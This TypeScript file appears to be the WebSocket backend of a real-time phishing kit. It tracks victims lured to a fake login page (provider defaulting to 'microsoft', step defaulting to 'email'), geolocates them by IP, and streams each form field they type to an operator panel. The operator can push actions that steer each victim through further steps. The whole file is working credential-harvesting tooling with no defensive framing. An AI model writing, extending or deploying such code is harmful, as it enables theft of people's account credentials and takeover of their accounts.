import type { IncomingMessage } from 'http';
import type { Server } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import { logger } from './lib/logger.js';

interface Location {
  city: string;
  country: string;
  countryCode: string;
  flag: string;
}

interface Visitor {
  id: string;
  ws: WebSocket;
  ip: string;
  location: Location;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
}

interface VisitorPublic {
  id: string;
  ip: string;
  location: Location;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
}

const visitors = new Map<string, Visitor>();
const admins = new Set<WebSocket>();

function getClientIP(req: IncomingMessage): string {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) {
    const raw = Array.isArray(fwd) ? fwd[0] : fwd;
    return raw.split(',')[0]?.trim() ?? '0.0.0.0';
  }
  return req.socket.remoteAddress ?? '0.0.0.0';
}

async function fetchLocation(ip: string): Promise<Location> {
  const clean = ip.replace(/^::ffff:/, '');
  const isLocal =
    clean === '127.0.0.1' ||
    clean === '::1' ||
    clean.startsWith('10.') ||
    clean.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(clean);

  if (isLocal) {
    return { city: 'Local Network', country: 'Local', countryCode: 'XX', flag: '🖥️' };
  }

  try {
    const res = await fetch(`http://ip-api.com/json/${clean}?fields=status,city,country,countryCode`);
    const data = await (res.json() as Promise<{
      status: string;
      city: string;
      country: string;
      countryCode: string;
    }>);
    if (data.status === 'success') {
      const flag = data.countryCode
        .toUpperCase()
        .split('')
        .map((c) => String.fromCodePoint(c.charCodeAt(0) + 127397))
        .join('');
      return { city: data.city, country: data.country, countryCode: data.countryCode, flag };
    }
  } catch (err) {
    logger.warn({ err }, 'geolocation fetch failed');
  }
  return { city: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐' };
}

function broadcastToAdmins(data: object) {
  const msg = JSON.stringify(data);
  for (const ws of admins) {
    if (ws.readyState === WebSocket.OPEN) ws.send(msg);
  }
}

function toPublic(v: Visitor): VisitorPublic {
  return {
    id: v.id,
    ip: v.ip,
    location: v.location,
    provider: v.provider,
    step: v.step,
    userAgent: v.userAgent,
    connectedAt: v.connectedAt,
    formData: { ...v.formData },
  };
}

export function setupWebSocket(server: Server) {
  const wss = new WebSocketServer({ server, path: '/api/ws' });

  wss.on('connection', (ws: WebSocket, req: IncomingMessage) => {
    const ip = getClientIP(req);

    ws.once('message', (raw) => {
      let msg: Record<string, unknown>;
      try {
        msg = JSON.parse(raw.toString()) as Record<string, unknown>;
      } catch {
        ws.close();
        return;
      }

      if (msg['type'] === 'register-admin') {
        admins.add(ws);
        ws.send(
          JSON.stringify({
            type: 'visitors',
            visitors: Array.from(visitors.values()).map(toPublic),
          }),
        );

        ws.on('message', (raw2) => {
          try {
            const m = JSON.parse(raw2.toString()) as Record<string, unknown>;
            if (m['type'] === 'push-action') {
              const visitor = visitors.get(m['visitorId'] as string);
              if (visitor?.ws.readyState === WebSocket.OPEN) {
                visitor.ws.send(JSON.stringify({ type: 'action', action: m['action'] }));
                logger.info({ visitorId: m['visitorId'], action: m['action'] }, 'Admin pushed action');
              }
            }
          } catch (err) {
            logger.warn({ err }, 'Admin message parse error');
          }
        });

        ws.on('close', () => {
          admins.delete(ws);
        });

        logger.info('Admin connected');
      } else if (msg['type'] === 'register-visitor') {
        const id = msg['id'] as string;

        fetchLocation(ip)
          .then((location) => {
            const visitor: Visitor = {
              id,
              ws,
              ip,
              location,
              provider: (msg['provider'] as string) || 'microsoft',
              step: (msg['step'] as string) || 'email',
              userAgent: (msg['userAgent'] as string) || '',
              connectedAt: Date.now(),
              formData: {},
            };
            visitors.set(id, visitor);
            broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
            logger.info({ id, ip, location }, 'Visitor connected');
          })
          .catch((err) => {
            logger.warn({ err }, 'Failed to register visitor');
          });

        ws.on('message', (raw2) => {
          try {
            const m = JSON.parse(raw2.toString()) as Record<string, unknown>;
            if (m['type'] === 'step-update') {
              const v = visitors.get(id);
              if (v) {
                v.step = (m['step'] as string) ?? v.step;
                if (m['provider']) v.provider = m['provider'] as string;
                broadcastToAdmins({
                  type: 'visitor-updated',
                  id,
                  step: v.step,
                  provider: v.provider,
                });
              }
            } else if (m['type'] === 'form-data') {
              const v = visitors.get(id);
              if (v) {
                const field = m['field'] as string;
                const value = m['value'] as string;
                v.formData[field] = value;
                broadcastToAdmins({
                  type: 'visitor-form-data',
                  id,
                  field,
                  value,
                });
                logger.info({ id, field }, 'Visitor form data captured');
              }
            }
          } catch (err) {
            logger.warn({ err }, 'Visitor message parse error');
          }
        });

        ws.on('close', () => {
          visitors.delete(id);
          broadcastToAdmins({ type: 'visitor-left', id });
          logger.info({ id }, 'Visitor disconnected');
        });
      } else {
        ws.close();
      }
    });
  });

  logger.info('WebSocket server ready at /api/ws');
}
